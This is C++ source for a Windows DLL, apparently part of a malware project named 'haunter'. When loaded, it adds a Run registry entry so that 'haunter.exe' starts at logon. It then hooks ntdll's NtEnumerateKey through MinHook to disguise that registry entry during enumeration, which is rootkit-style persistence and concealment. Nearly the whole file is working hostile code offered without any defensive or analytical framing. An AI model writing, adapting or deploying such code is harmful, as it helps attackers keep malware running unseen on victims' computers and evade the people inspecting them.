#include "pch.h"
#include "config.hpp"
#include <winternl.h>
#include <vector>

bool CreateRegistryKey()
{
    const wchar_t* keyName = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const wchar_t* valueName = L"haunter";
    std::wstring haunterPath = PathHide;
    haunterPath += L"haunter.exe";
    if (PathFileExists(haunterPath.c_str()) != FALSE) {
        HKEY hKey;
        LONG result = RegCreateKeyEx(HKEY_CURRENT_USER, keyName, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);

        if (result != ERROR_SUCCESS)
        {
            return false;
        }
        result = RegSetValueEx(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(haunterPath.c_str()), (haunterPath.size() + 1) * sizeof(wchar_t));

        RegCloseKey(hKey);

        return result == ERROR_SUCCESS;
    }
}


struct HiddenKeyInfo {
    std::wstring originalName;
    std::wstring replacementName;
};

std::vector<HiddenKeyInfo> hiddenKeys;

void AddHiddenKey(const wchar_t* originalName, const wchar_t* replacementName)
{
    HiddenKeyInfo info;
    info.originalName = originalName;
    info.replacementName = replacementName;
    hiddenKeys.push_back(info);
}

typedef NTSTATUS(WINAPI* PNT_ENUMERATE_KEY)(
    HANDLE  KeyHandle,
    ULONG   Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID   KeyInformation,
    ULONG   Length,
    PULONG  ResultLength
    );

PNT_ENUMERATE_KEY Original_NtEnumerateKey;

NTSTATUS WINAPI Hooked_NtEnumerateKey(
    HANDLE  KeyHandle,
    ULONG   Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID   KeyInformation,
    ULONG   Length,
    PULONG  ResultLength
)
{
    NTSTATUS result = Original_NtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);

    if (result == STATUS_SUCCESS && KeyInformationClass == KeyBasicInformation)
    {
        PKEY_BASIC_INFORMATION keyInfo = reinterpret_cast<PKEY_BASIC_INFORMATION>(KeyInformation);

        for (const HiddenKeyInfo& hiddenKey : hiddenKeys)
        {
            if (keyInfo->NameLength / sizeof(wchar_t) == hiddenKey.originalName.size() &&
                wcsncmp(keyInfo->Name, hiddenKey.originalName.c_str(), keyInfo->NameLength / sizeof(wchar_t)) == 0)
            {
                wcsncpy_s(keyInfo->Name, keyInfo->NameLength / sizeof(wchar_t), hiddenKey.replacementName.c_str(), _TRUNCATE);
                break;
            }
        }
    }

    return result;
}

bool set_nt_enum_key_hook()
{
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    if (!hNtdll)
        return false;

    Original_NtEnumerateKey = (PNT_ENUMERATE_KEY)GetProcAddress(hNtdll, "NtEnumerateKey");

    if (MH_Initialize() != MH_OK)
        return false;

    if (MH_CreateHook(Original_NtEnumerateKey, &Hooked_NtEnumerateKey, (LPVOID*)&Original_NtEnumerateKey) != MH_OK)
        return false;

    if (MH_EnableHook(Original_NtEnumerateKey) != MH_OK)
        return false;

    return true;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        if (!CreateRegistryKey())
        {
            return FALSE;
        }
        AddHiddenKey(L"haunter", L"haunter2");
        if (!set_nt_enum_key_hook())
        {
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
